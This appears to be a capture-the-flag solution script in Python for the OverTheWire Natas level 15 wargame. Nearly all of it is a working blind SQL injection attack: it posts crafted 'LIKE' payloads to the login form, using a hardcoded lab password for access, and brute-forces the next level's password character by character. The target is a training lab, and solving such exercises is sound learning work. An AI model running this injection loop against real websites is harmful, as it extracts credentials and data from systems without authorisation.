import requests
import re
import logging

URL = 'http://natas15.natas.labs.overthewire.org/index.php?debug'
username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

#query = 'natas16"'


#response = requests.get(URL, auth = (username , password))

#response = requests.post(URL,data = {'username':query}, auth = (username , password))

#data = response.text
#print data

#start = data.find('Executing query') 
#end = data.find('<',start)
#print data[start:end]

#print re.search (r'Executing query.+<br>',data).group(0)

#- - - - - - - - - - - - - - - - Brute Force Password Cracker - - - - - - - - - - - 

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
final_pass = ""

for _ in range(64):
    for ch in characters:
        test_pass = final_pass + ch

        query = 'natas16" AND BINARY password LIKE "'+test_pass+'%" AND "1"="1'
        
        response = requests.post(URL,data = {'username':query}, auth = (username , password))
        
        data = re.search (r'Executing query.+<br>',response.text).group(0)
        
        if "user exists" in data : 
            final_pass = final_pass + ch
            print final_pass
            break


print final_pass

#- - - - - - - - - - - - - - - - -  - - - - - - - - - - - - - - - -
